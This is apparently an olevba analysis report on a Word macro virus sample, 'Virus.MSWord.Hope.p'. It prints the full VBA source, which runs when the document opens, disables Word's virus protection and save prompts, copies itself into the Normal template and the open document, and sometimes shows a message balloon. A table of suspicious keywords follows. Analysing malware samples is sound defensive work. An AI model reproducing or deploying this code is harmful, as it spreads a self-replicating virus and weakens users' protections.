olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Hope.p
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Hope.p - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open() 'CheeChoong
 On Error Resume Next
 With Options
  .VirusProtection = (1 * 2 * 3 - 6)
  .SaveNormalPrompt = (6 - 3 * 2 * 1)
  .ConfirmConversions = (0 + 0)
 End With
 Set a = NormalTemplate: Set b = a.VBProject: Set c = b.VBComponents
 Set e = ActiveDocument: Set f = e.VBProject: Set g = f.VBComponents
 CheeChoong = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
 g.Item(1).CodeModule.DeleteLines 1, g.Item(1).CodeModule.CountOfLines
 c.Item(1).CodeModule.DeleteLines 1, c.Item(1).CodeModule.CountOfLines
 g.Item(1).CodeModule.AddFromString CheeChoong
 c.Item(1).CodeModule.AddFromString CheeChoong
 If Day(Now()) = Month(Now()) Then
  Assistant.Visible = True
  Assistant.Animation = msoAnimationThinking
  With Assistant.NewBalloon
    .Heading = "CheeChoong!!"
    .Text = "Have a great CheeChoong..."
    .Show
  End With
  Assistant.Visible = False
 End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

